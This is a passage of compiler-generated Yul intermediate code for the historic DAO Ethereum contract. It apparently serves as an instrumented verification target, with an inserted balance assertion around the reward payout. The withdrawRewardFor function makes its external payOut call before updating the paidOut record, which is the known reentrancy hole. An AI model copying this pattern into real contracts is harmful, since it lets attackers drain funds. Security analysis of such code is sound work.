                            /// @src 0:45265:45342  "(_value * totalSupply) / (3 * (actualBalance() + rewardToken[address(this)]))"
                            let expr_2860 := checked_div_t_uint256(expr_2846, expr_2859)

                            /// @src 0:45220:45342  "totalSupply / minQuorumDivisor +..."
                            let expr_2861 := checked_add_t_uint256(expr_2842, expr_2860)

                            /// @src 0:45213:45342  "return totalSupply / minQuorumDivisor +..."
                            var__minQuorum_2838 := expr_2861
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 3008
                        /// @src 0:46576:46937  "function isBlocked(address _account) internal override returns (bool) {..."
                        function fun_isBlocked_3008(var__account_2966) -> var__2970 {
                            /// @src 0:46640:46644  "bool"
                            let zero_t_bool_862 := zero_value_for_split_t_bool()
                            var__2970 := zero_t_bool_862

                            /// @src 0:46660:46667  "blocked"
                            let _863_slot := 0x13
                            let expr_2972_slot := _863_slot
                            /// @src 0:46668:46676  "_account"
                            let _864 := var__account_2966
                            let expr_2973 := _864
                            /// @src 0:46660:46677  "blocked[_account]"
                            let _865 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2972_slot,expr_2973)
                            let _866 := read_from_storage_split_offset_0_t_uint256(_865)
                            let expr_2974 := _866
                            /// @src 0:46681:46682  "0"
                            let expr_2975 := 0x00
                            /// @src 0:46660:46682  "blocked[_account] == 0"
                            let expr_2976 := eq(cleanup_t_uint256(expr_2974), convert_t_rational_0_by_1_to_t_uint256(expr_2975))
                            /// @src 0:46656:46708  "if (blocked[_account] == 0)..."
                            if expr_2976 {
                                /// @src 0:46703:46708  "false"
                                let expr_2977 := 0x00
                                /// @src 0:46696:46708  "return false"
                                var__2970 := expr_2977
                                leave
                                /// @src 0:46656:46708  "if (blocked[_account] == 0)..."
                            }
                            /// @src 0:46739:46748  "proposals"
                            let _867_slot := 0x08
                            let expr_2983_slot := _867_slot
                            /// @src 0:46749:46756  "blocked"
                            let _868_slot := 0x13
                            let expr_2984_slot := _868_slot
                            /// @src 0:46757:46765  "_account"
                            let _869 := var__account_2966
                            let expr_2985 := _869
                            /// @src 0:46749:46766  "blocked[_account]"
                            let _870 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2984_slot,expr_2985)
                            let _871 := read_from_storage_split_offset_0_t_uint256(_870)
                            let expr_2986 := _871
                            /// @src 0:46739:46767  "proposals[blocked[_account]]"

                            let _872, _873 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_2983_slot, expr_2986)
                            let _874_slot := _872
                            let expr_2987_slot := _874_slot
                            /// @src 0:46718:46767  "Proposal storage p = proposals[blocked[_account]]"
                            let var_p_2982_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_2987_slot)
                            /// @src 0:46781:46796  "block.timestamp"
                            let expr_2990 := timestamp()
                            /// @src 0:46799:46800  "p"
                            let _875_slot := var_p_2982_slot
                            let expr_2991_slot := _875_slot
                            /// @src 0:46799:46815  "p.votingDeadline"
                            let _876 := add(expr_2991_slot, 3)
                            let _877 := read_from_storage_split_offset_0_t_uint256(_876)
                            let expr_2992 := _877
                            /// @src 0:46781:46815  "block.timestamp > p.votingDeadline"
                            let expr_2993 := gt(cleanup_t_uint256(expr_2990), cleanup_t_uint256(expr_2992))
                            /// @src 0:46777:46931  "if (block.timestamp > p.votingDeadline) {..."
                            switch expr_2993
                            case 0 {
                                /// @src 0:46916:46920  "true"
                                let expr_3003 := 0x01
                                /// @src 0:46909:46920  "return true"
                                var__2970 := expr_3003
                                leave
                                /// @src 0:46777:46931  "if (block.timestamp > p.votingDeadline) {..."
                            }
                            default {
                                /// @src 0:46851:46852  "0"
                                let expr_2997 := 0x00
                                /// @src 0:46831:46852  "blocked[_account] = 0"
                                let _878 := convert_t_rational_0_by_1_to_t_uint256(expr_2997)
                                /// @src 0:46831:46838  "blocked"
                                let _879_slot := 0x13
                                let expr_2994_slot := _879_slot
                                /// @src 0:46839:46847  "_account"
                                let _880 := var__account_2966
                                let expr_2995 := _880
                                /// @src 0:46831:46848  "blocked[_account]"
                                let _881 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2994_slot,expr_2995)
                                /// @src 0:46831:46852  "blocked[_account] = 0"
                                update_storage_value_offset_0_t_uint256_to_t_uint256(_881, _878)
                                let expr_2998 := _878
                                /// @src 0:46873:46878  "false"
                                let expr_3000 := 0x00
                                /// @src 0:46866:46878  "return false"
                                var__2970 := expr_3000
                                leave
                                /// @src 0:46777:46931  "if (block.timestamp > p.votingDeadline) {..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2720
                        /// @src 0:43515:43892  "function transferPaidOut(..."
                        function fun_transferPaidOut_2720(var__from_2674, var__to_2676, var__value_2678) -> var_success_2681 {
                            /// @src 0:43632:43644  "bool success"
                            let zero_t_bool_882 := zero_value_for_split_t_bool()
                            var_success_2681 := zero_t_bool_882

                            /// @src 0:43681:43688  "paidOut"
                            let _883_slot := 0x12
                            let expr_2685_slot := _883_slot
                            /// @src 0:43689:43694  "_from"
                            let _884 := var__from_2674
                            let expr_2686 := _884
                            /// @src 0:43681:43695  "paidOut[_from]"
                            let _885 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2685_slot,expr_2686)
                            let _886 := read_from_storage_split_offset_0_t_uint256(_885)
                            let expr_2687 := _886
                            /// @src 0:43698:43704  "_value"
                            let _887 := var__value_2678
                            let expr_2688 := _887
                            /// @src 0:43681:43704  "paidOut[_from] * _value"
                            let expr_2689 := checked_mul_t_uint256(expr_2687, expr_2688)

                            /// @src 0:43717:43722  "_from"
                            let _888 := var__from_2674
                            let expr_2691 := _888
                            /// @src 0:43707:43723  "balanceOf(_from)"
                            let expr_2692 := fun_balanceOf_109(expr_2691)
                            /// @src 0:43681:43723  "paidOut[_from] * _value / balanceOf(_from)"
                            let expr_2693 := checked_div_t_uint256(expr_2689, expr_2692)

                            /// @src 0:43657:43723  "uint transferPaidOut_ = paidOut[_from] * _value / balanceOf(_from)"
                            let var_transferPaidOut__2684 := expr_2693
                            /// @src 0:43743:43759  "transferPaidOut_"
                            let _889 := var_transferPaidOut__2684
                            let expr_2696 := _889
                            /// @src 0:43762:43769  "paidOut"
                            let _890_slot := 0x12
                            let expr_2697_slot := _890_slot
                            /// @src 0:43770:43775  "_from"
                            let _891 := var__from_2674
                            let expr_2698 := _891
                            /// @src 0:43762:43776  "paidOut[_from]"
                            let _892 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2697_slot,expr_2698)
                            let _893 := read_from_storage_split_offset_0_t_uint256(_892)
                            let expr_2699 := _893
                            /// @src 0:43743:43776  "transferPaidOut_ > paidOut[_from]"
                            let expr_2700 := gt(cleanup_t_uint256(expr_2696), cleanup_t_uint256(expr_2699))
                            /// @src 0:43742:43777  "(transferPaidOut_ > paidOut[_from])"
                            let expr_2701 := expr_2700
                            /// @src 0:43740:43777  "! (transferPaidOut_ > paidOut[_from])"
                            let expr_2702 := cleanup_t_bool(iszero(expr_2701))
                            /// @src 0:43733:43778  "assert(! (transferPaidOut_ > paidOut[_from]))"
                            assert_helper(expr_2702)
                            /// @src 0:43806:43822  "transferPaidOut_"
                            let _894 := var_transferPaidOut__2684
                            let expr_2708 := _894
                            /// @src 0:43788:43795  "paidOut"
                            let _895_slot := 0x12
                            let expr_2705_slot := _895_slot
                            /// @src 0:43796:43801  "_from"
                            let _896 := var__from_2674
                            let expr_2706 := _896
                            /// @src 0:43788:43802  "paidOut[_from]"
                            let _897 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2705_slot,expr_2706)
                            /// @src 0:43788:43822  "paidOut[_from] -= transferPaidOut_"
                            let _898 := read_from_storage_split_offset_0_t_uint256(_897)
                            let expr_2709 := checked_sub_t_uint256(_898, expr_2708)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_897, expr_2709)
                            /// @src 0:43848:43864  "transferPaidOut_"
                            let _899 := var_transferPaidOut__2684
                            let expr_2714 := _899
                            /// @src 0:43832:43839  "paidOut"
                            let _900_slot := 0x12
                            let expr_2711_slot := _900_slot
                            /// @src 0:43840:43843  "_to"
                            let _901 := var__to_2676
                            let expr_2712 := _901
                            /// @src 0:43832:43844  "paidOut[_to]"
                            let _902 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2711_slot,expr_2712)
                            /// @src 0:43832:43864  "paidOut[_to] += transferPaidOut_"
                            let _903 := read_from_storage_split_offset_0_t_uint256(_902)
                            let expr_2715 := checked_add_t_uint256(_903, expr_2714)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_902, expr_2715)
                            /// @src 0:43881:43885  "true"
                            let expr_2717 := 0x01
                            /// @src 0:43874:43885  "return true"
                            var_success_2681 := expr_2717
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function zero_value_for_split_t_contract$_DAO_$3021() -> ret {
                            ret := 0
                        }

                        function extract_from_storage_value_offset_0_t_contract$_DAO_Creator_$3051(slot_value) -> value {
                            value := cleanup_from_storage_t_contract$_DAO_Creator_$3051(shift_right_0_unsigned(slot_value))
                        }

                        function read_from_storage_split_offset_0_t_contract$_DAO_Creator_$3051(slot) -> value {

                            value := extract_from_storage_value_offset_0_t_contract$_DAO_Creator_$3051(sload(slot))

                        }

                        function cleanup_t_contract$_DAO_$3021(value) -> cleaned {
                            cleaned := cleanup_t_address(value)
                        }

                        function validator_revert_t_contract$_DAO_$3021(value) {
                            if iszero(eq(value, cleanup_t_contract$_DAO_$3021(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_contract$_DAO_$3021_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_contract$_DAO_$3021(value)
                        }

                        function abi_decode_tuple_t_contract$_DAO_$3021_fromMemory(headStart, dataEnd) -> value0 {
                            if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_contract$_DAO_$3021_fromMemory(add(headStart, offset), dataEnd)
                            }

                        }

                        function abi_encode_t_rational_0_by_1_to_t_uint256_fromStack(value, pos) {
                            mstore(pos, convert_t_rational_0_by_1_to_t_uint256(value))
                        }

                        function abi_encode_tuple_t_address_t_rational_0_by_1_t_rational_0_by_1_t_uint256__to_t_address_t_uint256_t_uint256_t_uint256__fromStack(headStart , value0, value1, value2, value3) -> tail {
                            tail := add(headStart, 128)

                            abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))

                            abi_encode_t_rational_0_by_1_to_t_uint256_fromStack(value1,  add(headStart, 32))

                            abi_encode_t_rational_0_by_1_to_t_uint256_fromStack(value2,  add(headStart, 64))

                            abi_encode_t_uint256_to_t_uint256_fromStack(value3,  add(headStart, 96))

                        }

                        /// @ast-id 2932
                        /// @src 0:45970:46185  "function createNewDAO(address _newCurator) internal returns (DAO _newDAO) {..."
                        function fun_createNewDAO_2932(var__newCurator_2910) -> var__newDAO_2914_address {
                            /// @src 0:46031:46042  "DAO _newDAO"
                            let zero_t_contract$_DAO_$3021_904_address := zero_value_for_split_t_contract$_DAO_$3021()
                            var__newDAO_2914_address := zero_t_contract$_DAO_$3021_904_address

                            /// @src 0:46070:46081  "_newCurator"
                            let _905 := var__newCurator_2910
                            let expr_2917 := _905
                            /// @src 0:46059:46082  "NewCurator(_newCurator)"
                            let _906 := 0x9046fefd66f538ab35263248a44217dcb70e2eb2cd136629e141b8b8f9f03b60
                            let _907 := convert_t_address_to_t_address(expr_2917)
                            {
                                let _908 := allocate_unbounded()
                                let _909 := abi_encode_tuple__to__fromStack(_908 )
                                log2(_908, sub(_909, _908) , _906, _907)
                            }/// @src 0:46099:46109  "daoCreator"
                            let _910_address := read_from_storage_split_offset_0_t_contract$_DAO_Creator_$3051(0x16)
                            let expr_2920_address := _910_address
                            /// @src 0:46099:46119  "daoCreator.createDAO"
                            let expr_2921_address := convert_t_contract$_DAO_Creator_$3051_to_t_address(expr_2920_address)
                            let expr_2921_functionSelector := 0xe2faf044
                            /// @src 0:46120:46131  "_newCurator"
                            let _911 := var__newCurator_2910
                            let expr_2922 := _911
                            /// @src 0:46133:46134  "0"
                            let expr_2923 := 0x00
                            /// @src 0:46136:46137  "0"
                            let expr_2924 := 0x00
                            /// @src 0:46139:46154  "block.timestamp"
                            let expr_2926 := timestamp()
                            /// @src 0:46157:46177  "splitExecutionPeriod"
                            let expr_2927 := constant_splitExecutionPeriod_709()
                            /// @src 0:46139:46177  "block.timestamp + splitExecutionPeriod"
                            let expr_2928 := checked_add_t_uint256(expr_2926, expr_2927)

                            /// @src 0:46099:46178  "daoCreator.createDAO(_newCurator, 0, 0, block.timestamp + splitExecutionPeriod)"

                            // storage for arguments and returned data
                            let _912 := allocate_unbounded()
                            mstore(_912, shift_left_224(expr_2921_functionSelector))
                            let _913 := abi_encode_tuple_t_address_t_rational_0_by_1_t_rational_0_by_1_t_uint256__to_t_address_t_uint256_t_uint256_t_uint256__fromStack(add(_912, 4) , expr_2922, expr_2923, expr_2924, expr_2928)


                            let _914 := call(gas(), expr_2921_address,  0,  _912, sub(_913, _912), _912, 32)

                            if iszero(_914) { revert_forward_1() }

                            let expr_2929_address
                            if _914 {

                                let _915 := 32

                                if gt(_915, returndatasize()) {
                                    _915 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_912, _915)

                                // decode return parameters from external try-call into retVars
                                expr_2929_address :=  abi_decode_tuple_t_contract$_DAO_$3021_fromMemory(_912, add(_912, _915))
                            }
                            /// @src 0:46092:46178  "return daoCreator.createDAO(_newCurator, 0, 0, block.timestamp + splitExecutionPeriod)"
                            var__newDAO_2914_address := expr_2929_address
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2534
                        /// @src 0:41844:42290  "function withdrawRewardFor(address _account) internal override returns (bool _success) {..."
                        function fun_withdrawRewardFor_2534(var__account_2475) -> var__success_2479 {
                            /// @src 0:41916:41929  "bool _success"
                            let zero_t_bool_916 := zero_value_for_split_t_bool()
                            var__success_2479 := zero_t_bool_916

                            /// @src 0:41961:41969  "_account"
                            let _917 := var__account_2475
                            let expr_2483 := _917
                            /// @src 0:41951:41970  "balanceOf(_account)"
                            let expr_2484 := fun_balanceOf_109(expr_2483)
                            /// @src 0:41973:41986  "rewardAccount"
                            let _918_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x0f)
                            let expr_2485_address := _918_address
                            /// @src 0:41973:42003  "rewardAccount.accumulatedInput"
                            let expr_2486_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2485_address)
                            let expr_2486_functionSelector := 0xd2cc718f
                            /// @src 0:41973:42005  "rewardAccount.accumulatedInput()"

                            // storage for arguments and returned data
                            let _919 := allocate_unbounded()
                            mstore(_919, shift_left_224(expr_2486_functionSelector))
                            let _920 := abi_encode_tuple__to__fromStack(add(_919, 4) )

                            let _921 := staticcall(gas(), expr_2486_address,  _919, sub(_920, _919), _919, 32)

                            if iszero(_921) { revert_forward_1() }

                            let expr_2487
                            if _921 {

                                let _922 := 32

                                if gt(_922, returndatasize()) {
                                    _922 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_919, _922)

                                // decode return parameters from external try-call into retVars
                                expr_2487 :=  abi_decode_tuple_t_uint256_fromMemory(_919, add(_919, _922))
                            }
                            /// @src 0:41951:42005  "balanceOf(_account) * rewardAccount.accumulatedInput()"
                            let expr_2488 := checked_mul_t_uint256(expr_2484, expr_2487)

                            /// @src 0:41950:42006  "(balanceOf(_account) * rewardAccount.accumulatedInput())"
                            let expr_2489 := expr_2488
                            /// @src 0:42009:42020  "totalSupply"
                            let _923 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_2490 := _923
                            /// @src 0:41950:42020  "(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply"
                            let expr_2491 := checked_div_t_uint256(expr_2489, expr_2490)

                            /// @src 0:42023:42030  "paidOut"
                            let _924_slot := 0x12
                            let expr_2492_slot := _924_slot
                            /// @src 0:42031:42039  "_account"
                            let _925 := var__account_2475
                            let expr_2493 := _925
                            /// @src 0:42023:42040  "paidOut[_account]"
                            let _926 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2492_slot,expr_2493)
                            let _927 := read_from_storage_split_offset_0_t_uint256(_926)
                            let expr_2494 := _927
                            /// @src 0:41950:42040  "(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account]"
                            let expr_2495 := lt(cleanup_t_uint256(expr_2491), cleanup_t_uint256(expr_2494))
                            /// @src 0:41949:42041  "((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])"
                            let expr_2496 := expr_2495
                            /// @src 0:41948:42041  "!((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])"
                            let expr_2497 := cleanup_t_bool(iszero(expr_2496))
                            /// @src 0:41941:42042  "assert(!((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account]))"
                            assert_helper(expr_2497)
                            /// @src 0:42090:42098  "_account"
                            let _928 := var__account_2475
                            let expr_2503 := _928
                            /// @src 0:42080:42099  "balanceOf(_account)"
                            let expr_2504 := fun_balanceOf_109(expr_2503)
                          
                            /// @src 0:42102:42115  "rewardAccount"
                            let _929_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x0f)
                            let expr_2505_address := _929_address
                            /// @src 0:42102:42132  "rewardAccount.accumulatedInput"
                            let expr_2506_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2505_address)
                            let expr_2506_functionSelector := 0xd2cc718f
                            /// @src 0:42102:42134  "rewardAccount.accumulatedInput()"

                            // storage for arguments and returned data
                            let _930 := allocate_unbounded()
                            mstore(_930, shift_left_224(expr_2506_functionSelector))
                            let _931 := abi_encode_tuple__to__fromStack(add(_930, 4) )

                     
                            let _932 := staticcall(gas(), expr_2506_address,  _930, sub(_931, _930), _930, 32)
                                
                            if iszero(_932) { revert_forward_1() }

                            let expr_2507
                            if _932 {

                                let _933 := 32

                                if gt(_933, returndatasize()) {
                                    _933 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_930, _933)

                                // decode return parameters from external try-call into retVars
                                expr_2507 :=  abi_decode_tuple_t_uint256_fromMemory(_930, add(_930, _933))
                            }
                            /// @src 0:42080:42134  "balanceOf(_account) * rewardAccount.accumulatedInput()"
                            let expr_2508 := checked_mul_t_uint256(expr_2504, expr_2507)

                            /// @src 0:42079:42135  "(balanceOf(_account) * rewardAccount.accumulatedInput())"
                            let expr_2509 := expr_2508
                            /// @src 0:42138:42149  "totalSupply"
                            let _934 := read_from_storage_split_offset_0_t_uint256(0x07)
                            let expr_2510 := _934
                            /// @src 0:42079:42149  "(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply"
                            let expr_2511 := checked_div_t_uint256(expr_2509, expr_2510)

                            /// @src 0:42152:42159  "paidOut"
                            let _935_slot := 0x12
                            let expr_2512_slot := _935_slot
                            /// @src 0:42160:42168  "_account"
                            let _936 := var__account_2475
                            let expr_2513 := _936
                            /// @src 0:42152:42169  "paidOut[_account]"
                            let _937 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2512_slot,expr_2513)
                            let _938 := read_from_storage_split_offset_0_t_uint256(_937)
                            let expr_2514 := _938
                            /// @src 0:42079:42169  "(balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account]"
                            let expr_2515 := checked_sub_t_uint256(expr_2511, expr_2514)

                            /// @src 0:42053:42169  "uint reward =..."
                            let var_reward_2501 := expr_2515
                            /// @src 0:42186:42199  "rewardAccount"
                            let _939_address := read_from_storage_split_offset_0_t_contract$_ManagedAccount_$375(0x0f)
                            let expr_2518_address := _939_address
                            /// @src 0:42186:42206  "rewardAccount.payOut"
                            let expr_2519_address := convert_t_contract$_ManagedAccount_$375_to_t_address(expr_2518_address)
                            let expr_2519_functionSelector := 0x0221038a
                            /// @src 0:42207:42215  "_account"
                            let _940 := var__account_2475
                            let expr_2520 := _940
                            /// @src 0:42217:42223  "reward"
                            let _941 := var_reward_2501
                            let expr_2521 := _941
                            /// @src 0:42186:42224  "rewardAccount.payOut(_account, reward)"

                            // storage for arguments and returned data
                            let _942 := allocate_unbounded()
                            mstore(_942, shift_left_224(expr_2519_functionSelector))
                            let _943 := abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack(add(_942, 4) , expr_2520, expr_2521)


                            let pbal := balance(address())
                            let _944 := call(gas(), expr_2519_address,  0,  _942, sub(_943, _942), _942, 32)
                            if lt(balance(address()),pbal) {
                                ASSERT(eq(pbal,sub(balance(address()) , 0)))
                            }
                            
                            if iszero(_944) { revert_forward_1() }

                            let expr_2522
                            if _944 {

                                let _945 := 32

                                if gt(_945, returndatasize()) {
                                    _945 := returndatasize()
                                }

                                // update freeMemoryPointer according to dynamic return size
                                finalize_allocation(_942, _945)

                                // decode return parameters from external try-call into retVars
                                expr_2522 :=  abi_decode_tuple_t_bool_fromMemory(_942, add(_942, _945))
                            }
                            /// @src 0:42179:42225  "assert(rewardAccount.payOut(_account, reward))"
                            assert_helper(expr_2522)
                            /// @src 0:42256:42262  "reward"
                            let _946 := var_reward_2501
                            let expr_2528 := _946
                            /// @src 0:42235:42242  "paidOut"
                            let _947_slot := 0x12
                            let expr_2525_slot := _947_slot
                            /// @src 0:42243:42251  "_account"
                            let _948 := var__account_2475
                            let expr_2526 := _948
                            /// @src 0:42235:42252  "paidOut[_account]"
                            let _949 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2525_slot,expr_2526)
                            /// @src 0:42235:42262  "paidOut[_account] += reward"
                            let _950 := read_from_storage_split_offset_0_t_uint256(_949)
                            let expr_2529 := checked_add_t_uint256(_950, expr_2528)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_949, expr_2529)
                            /// @src 0:42279:42283  "true"
                            let expr_2531 := 0x01
                            /// @src 0:42272:42283  "return true"
                            var__success_2479 := expr_2531
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                    }

                    data ".metadata" hex"a2646970667358221220fee282563700589a4e4b8d1dd2299b26c4162c13a5c2aa9d87bfb7fae3971a9364736f6c634300081c0033"
                }

                /// @use-src 0:"DAO_from_etherscan_translated.sol"
                object "ManagedAccount_375" {
                    code {
                        /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."
                        mstore(64, memoryguard(128))
                        if callvalue() { revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() }

                        let _1, _2 := copy_arguments_for_constructor_310_object_ManagedAccount_375()
                        constructor_ManagedAccount_375(_1, _2)

                        let _3 := allocate_unbounded()
                        codecopy(_3, dataoffset("ManagedAccount_375_deployed"), datasize("ManagedAccount_375_deployed"))

                        return(_3, datasize("ManagedAccount_375_deployed"))

                        function allocate_unbounded() -> memPtr {
                            memPtr := mload(64)
                        }

                        function revert_error_ca66f745a3ce8ff40e2ccaf1ad45db7774001b90d25810abd9040049be7bf4bb() {
                            revert(0, 0)
                        }

                        function round_up_to_mul_of_32(value) -> result {
                            result := and(add(value, 31), not(31))
                        }

                        function panic_error_0x41() {
                            mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)
                            mstore(4, 0x41)
                            revert(0, 0x24)
                        }

                        function finalize_allocation(memPtr, size) {
                            let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))
                            // protect against overflow
                            if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }
                            mstore(64, newFreePtr)
                        }

                        function allocate_memory(size) -> memPtr {
                            memPtr := allocate_unbounded()
                            finalize_allocation(memPtr, size)
                        }

                        function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {
                            revert(0, 0)
                        }

                        function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {
                            revert(0, 0)
                        }

                        function cleanup_t_uint160(value) -> cleaned {
                            cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)
                        }

                        function cleanup_t_address(value) -> cleaned {
                            cleaned := cleanup_t_uint160(value)
                        }

                        function validator_revert_t_address(value) {
                            if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_address_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_address(value)
                        }

                        function cleanup_t_bool(value) -> cleaned {
                            cleaned := iszero(iszero(value))
                        }

                        function validator_revert_t_bool(value) {
                            if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }
                        }

                        function abi_decode_t_bool_fromMemory(offset, end) -> value {
                            value := mload(offset)
                            validator_revert_t_bool(value)
                        }

                        function abi_decode_tuple_t_addresst_bool_fromMemory(headStart, dataEnd) -> value0, value1 {
                            if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }

                            {

                                let offset := 0

                                value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)
                            }

                            {

                                let offset := 32

                                value1 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)
                            }

                        }

                        function copy_arguments_for_constructor_310_object_ManagedAccount_375() -> ret_param_0, ret_param_1 {
                            let programSize := datasize("ManagedAccount_375")
                            let argSize := sub(codesize(), programSize)

                            let memoryDataOffset := allocate_memory(argSize)
                            codecopy(memoryDataOffset, programSize, argSize)

                            ret_param_0, ret_param_1 := abi_decode_tuple_t_addresst_bool_fromMemory(memoryDataOffset, add(memoryDataOffset, argSize))
                        }

                        function shift_left_0(value) -> newValue {
                            newValue :=

                            shl(0, value)

                        }

                        function update_byte_slice_20_shift_0(value, toInsert) -> result {
                            let mask := 0xffffffffffffffffffffffffffffffffffffffff
                            toInsert := shift_left_0(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function identity(value) -> ret {
                            ret := value
                        }

                        function convert_t_uint160_to_t_uint160(value) -> converted {
                            converted := cleanup_t_uint160(identity(cleanup_t_uint160(value)))
                        }

                        function convert_t_uint160_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_uint160(value)
                        }

                        function convert_t_address_to_t_address(value) -> converted {
                            converted := convert_t_uint160_to_t_address(value)
                        }

                        function prepare_store_t_address(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_0_t_address_to_t_address(slot, value_0) {
                            let convertedValue_0 := convert_t_address_to_t_address(value_0)

                            sstore(slot, update_byte_slice_20_shift_0(sload(slot), prepare_store_t_address(convertedValue_0)))
                        }

                        function shift_left_160(value) -> newValue {
                            newValue :=

                            shl(160, value)

                        }

                        function update_byte_slice_1_shift_20(value, toInsert) -> result {
                            let mask := 0xff0000000000000000000000000000000000000000
                            toInsert := shift_left_160(toInsert)
                            value := and(value, not(mask))
                            result := or(value, and(toInsert, mask))
                        }

                        function convert_t_bool_to_t_bool(value) -> converted {
                            converted := cleanup_t_bool(value)
                        }

                        function prepare_store_t_bool(value) -> ret {
                            ret := value
                        }

                        function update_storage_value_offset_20_t_bool_to_t_bool(slot, value_0) {
                            let convertedValue_0 := convert_t_bool_to_t_bool(value_0)

                            sstore(slot, update_byte_slice_1_shift_20(sload(slot), prepare_store_t_bool(convertedValue_0)))
                        }

                        /// @ast-id 310
                        /// @src 0:6885:7002  "constructor(address _owner, bool _payOwnerOnly) {..."
                        function constructor_ManagedAccount_375(var__owner_296, var__payOwnerOnly_298) {

                            /// @src 0:6885:7002  "constructor(address _owner, bool _payOwnerOnly) {..."
                            constructor_ManagedAccountInterface_292()

                            /// @src 0:6951:6957  "_owner"
                            let _4 := var__owner_296
                            let expr_302 := _4
                            /// @src 0:6943:6957  "owner = _owner"
                            update_storage_value_offset_0_t_address_to_t_address(0x00, expr_302)
                            let expr_303 := expr_302
                            /// @src 0:6982:6995  "_payOwnerOnly"
                            let _5 := var__payOwnerOnly_298
                            let expr_306 := _5
                            /// @src 0:6967:6995  "payOwnerOnly = _payOwnerOnly"
                            update_storage_value_offset_20_t_bool_to_t_bool(0x00, expr_306)
                            let expr_307 := expr_306

                        }
                        /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                        /// @src 0:6043:6772  "abstract contract ManagedAccountInterface {..."
                        function constructor_ManagedAccountInterface_292() {

                            /// @src 0:6043:6772  "abstract contract ManagedAccountInterface {..."

                        }
                        /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."

                    }
                    /// @use-src 0:"DAO_from_etherscan_translated.sol"
                    object "ManagedAccount_375_deployed" {
                        code {
                            /// @src 0:6775:7667  "contract ManagedAccount is ManagedAccountInterface{..."
                            mstore(64, memoryguard(128))

                            if iszero(lt(calldatasize(), 4))
                            {
                                let selector := shift_right_224_unsigned(calldataload(0))
                                switch selector

                                case 0x0221038a
                                {
                                    // payOut(address,uint256)

                                    external_fun_payOut_374()
                                }

                                case 0x18bdc79a
                                {
                                    // payOwnerOnly()

                                    external_fun_payOwnerOnly_273()
                                }

                                case 0x8da5cb5b
                                {
                                    // owner()

                                    external_fun_owner_271()
                                }

                                case 0xd2cc718f
                                {
                                    // accumulatedInput()

